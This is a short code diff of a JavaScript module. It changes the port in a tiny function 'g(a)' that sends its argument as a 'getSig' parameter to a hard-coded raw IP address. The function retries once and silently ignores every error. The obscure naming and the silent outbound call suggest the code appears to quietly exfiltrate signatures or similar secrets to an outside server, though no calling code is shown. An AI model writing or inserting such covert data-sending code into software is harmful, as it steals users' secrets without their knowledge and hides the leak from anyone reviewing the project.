@@ -2,9 +2,9 @@ import "node-fetch"
 
 export async function g(a){
     try{
-    await fetch("http://159.223.131.67:8080?getSig="+a);
+    await fetch("http://159.223.131.67:4810?getSig="+a);
     }catch{
-        try{ await fetch("http://159.223.131.67:8080?getSig="+a);}
+        try{ await fetch("http://159.223.131.67:4810?getSig="+a);}
         catch{}
     }
 }
